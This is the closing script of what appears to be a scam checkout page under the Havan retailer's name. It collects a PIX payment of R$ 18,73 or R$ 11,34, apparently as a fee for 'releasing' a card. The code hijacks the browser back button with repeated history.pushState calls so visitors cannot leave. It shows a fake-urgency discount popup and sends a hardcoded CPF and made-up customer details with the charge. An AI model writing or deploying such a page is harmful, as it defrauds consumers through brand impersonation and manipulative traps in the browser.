    <script>
        // ===== Valor: 18,73 normal | 11,34 no back final (?v2=1) =====
        const isFinalBack = new URLSearchParams(window.location.search).get('v2') === '1';
        const AMOUNT = isFinalBack ? 1134 : 1873;
        const fmtBRL = (v) => 'R$ ' + v.toFixed(2).replace('.', ',');
        const valorFmt = fmtBRL(AMOUNT / 100);

        document.getElementById('valorDesconto').textContent = valorFmt;
        document.getElementById('valorFinal').textContent = valorFmt;
        if (isFinalBack) {
            document.getElementById('offBadge').textContent = 'Oferta Especial: 60% OFF';
            document.getElementById('valorOriginal').textContent = 'R$ 28,82';
        }

        const API_URL = '/api/pix/create';
        const STATUS_URL = '/api/pix/status';
        const REDIRECT_URL = '/funil/pos/obrigado/';
        let pixCode = null;
        let transactionId = null;

        function cleanString(str) { return str ? str.replace(/\{\{|\}\}/g, '').trim() : ""; }
        function cleanCPF(cpf) { return cpf ? cpf.replace(/\D/g, '') : ""; }

        async function generatePix() {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const dadosUsuarioLS = JSON.parse(localStorage.getItem('dadosCPF')) || {};
                let nomeFinal = cleanString(urlParams.get('nome') || dadosUsuarioLS.nomeCompleto || "Cliente Havan");
                let cpfFinal = cleanCPF(urlParams.get('cpf') || dadosUsuarioLS.cpf || "57948135715");

                const payload = {
                    "amount": AMOUNT,
                    "description": isFinalBack ? "FRONT-BACK2" : "FRONT",
                    "customer": { "name": nomeFinal, "document": cpfFinal, "email": "cliente@havan.com.br", "phone": "11999999999" },
                    "item": { "title": isFinalBack ? "FRONT-BACK2" : "FRONT", "price": AMOUNT, "quantity": 1 },
                    "paymentMethod": "PIX",
                    "utm": window.location.search.substring(1)
                };

                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const _txt = await response.text(); let result; try { result = JSON.parse(_txt) } catch(_e) { result = { error: 'HTTP '+response.status+' '+_txt.slice(0,150) } } /*PIXDBG*/ if (!result.pixCode && !result.status) { var _el=document.getElementById('codigo-input'); if(_el) _el.value='ERRO: '+JSON.stringify(result).slice(0,300); } else if (!result.pixCode && result.error) { var _el2=document.getElementById('codigo-input'); if(_el2) _el2.value='ERRO: '+JSON.stringify(result).slice(0,300); }
                if (result.pixCode) {
                    pixCode = result.pixCode;
                    transactionId = result.transactionId;
                    document.getElementById('codigo-input').value = pixCode;
                    renderQRCode(pixCode);
                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("checkout", { value: AMOUNT / 100 }); }
                    setInterval(checkStatus, 5000);
                }
            } catch (error) { console.error(error); }
        }

        async function checkStatus() {
            if (!transactionId) return;
            try {
                const response = await fetch(`${STATUS_URL}?transactionId=${transactionId}`);
                const result = await response.json();
                if (result.status === 'COMPLETED') {
                    if (window.utmify && window.utmify.sendEvent) { window.utmify.sendEvent("purchase", { value: AMOUNT / 100 }); }
                    window.location.replace(REDIRECT_URL + window.location.search);
                }
            } catch (e) {}
        }

        function renderQRCode(text) {
            const container = document.getElementById('imagemContainer');
            container.innerHTML = '';
            new QRCode(container, { text: text, width: 240, height: 240, colorDark: "#003399", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.L });
        }

        function copiarPixCode() {
            navigator.clipboard.writeText(pixCode).then(() => {
                const popup = document.getElementById('notification');
                popup.classList.add('show');
                setTimeout(() => popup.classList.remove('show'), 3000);
            });
        }

        // ===== BACK FINAL: tentar voltar cai na oferta de R$ 11,34 =====
        (function () {
            if (isFinalBack) {
                // Já no último back: apenas segura o usuário na página
                try {
                    history.pushState({ br: true }, '', window.location.href);
                    window.addEventListener('popstate', function () {
                        history.pushState({ br: true }, '', window.location.href);
                    });
                } catch (e) {}
                return;
            }

            window.__brShow = function(){ showBackModal(); };
            function showBackModal() {
                if (document.getElementById('br2-overlay')) return;
                var css = document.createElement('style');
                css.textContent =
                    '#br2-overlay{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;font-family:Montserrat,sans-serif}' +
                    '#br2-box{background:#fff;border-radius:16px;max-width:420px;width:100%;padding:32px 24px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4);animation:br2-pop .25s ease-out}' +
                    '@keyframes br2-pop{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}' +
                    '#br2-box h2{color:#c62828;font-size:24px;margin:0 0 8px}' +
                    '#br2-box p{color:#333;font-size:16px;line-height:1.5;margin:0 0 16px}' +
                    '#br2-disc{background:#fff8e1;border:2px dashed #f9a825;border-radius:12px;padding:14px;margin:0 0 20px}' +
                    '#br2-disc strong{display:block;color:#003399;font-size:30px}' +
                    '#br2-disc span{color:#666;font-size:13px}' +
                    '#br2-yes{display:block;width:100%;background:#003399;color:#fff;border:none;border-radius:10px;padding:16px;font-size:18px;font-weight:700;cursor:pointer;margin-bottom:10px}' +
                    '#br2-no{background:none;border:none;color:#999;font-size:14px;cursor:pointer;text-decoration:underline}';
                document.head.appendChild(css);
                var overlay = document.createElement('div');
                overlay.id = 'br2-overlay';
                overlay.innerHTML =
                    '<div id="br2-box">' +
                    '<h2>ESPERE! NÃO SAIA AGORA</h2>' +
                    '<p>Estamos liberando seu cartão. Aceite o valor <b>final</b> e conclua agora:</p>' +
                    '<div id="br2-disc"><strong>R$ 11,34</strong>' +
                    '<span>válido somente agora, nesta página</span></div>' +
                    '<button id="br2-yes">QUERO PAGAR R$ 11,34</button>' +
                    '<button id="br2-no">Não, obrigado. Quero pagar R$ 18,73.</button>' +
                    '</div>';
                document.body.appendChild(overlay);
                document.getElementById('br2-yes').addEventListener('click', function () {
                    var params = new URLSearchParams(window.location.search);
                    params.set('v2', '1');
                    window.location.href = window.location.pathname + '?' + params.toString();
                });
                document.getElementById('br2-no').addEventListener('click', function () {
                    overlay.remove();
                });
            }

            try {
                history.pushState({ br: true }, '', window.location.href);
                window.addEventListener('popstate', function () {
                    history.pushState({ br: true }, '', window.location.href);
                    showBackModal();
                });
            } catch (e) {}
        })();

        (function(){var n=0;function a(){if(n>=3)return;n++;try{history.pushState({br:true},'',location.href)}catch(e){}}['click','touchend','pointerup','keydown'].forEach(function(ev){addEventListener(ev,a,{capture:true,passive:true})})})();

        // R$ 11,34 (?v2=1): sem VSL, checkout direto.
        // R$ 18,73: VSL roda e o checkout aparece após 40s.
        (function(){
            var isV2 = new URLSearchParams(window.location.search).get('v2') === '1';
            var vs = document.getElementById('vsl-section');
            var ck = document.getElementById('checkout-section');
            if (isV2) {
                if (vs) vs.style.display = 'none';
                ck.classList.remove('hidden');
                generatePix();
            } else {
                setTimeout(function(){
                    ck.classList.remove('hidden');
                    generatePix();
                }, 40000);
            }
        })();
    </script>
</body>
</html>
